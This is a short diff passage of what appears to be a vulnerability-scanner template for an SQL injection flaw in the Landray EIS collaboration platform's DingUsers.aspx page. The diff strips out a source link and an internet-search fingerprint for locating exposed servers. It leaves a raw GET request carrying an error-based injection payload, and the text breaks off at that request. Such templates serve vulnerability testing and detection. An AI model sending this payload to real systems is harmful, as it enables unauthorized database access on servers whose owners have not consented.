@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台 DingUsers.aspx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qb28ogrg18wo5qkt'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qb28ogrg18wo5qkt
-    fofa: body="/sc ripts/jquery.landray.common.js" || body="v11_QRcodeBar clr" || title="智慧协同平台" && body="欢迎登录智慧协同平台"
 http:
 - raw:
   - 'GET /SM/DingUsers.aspx?id=1%20and%201=@@version-- HTTP/1.1
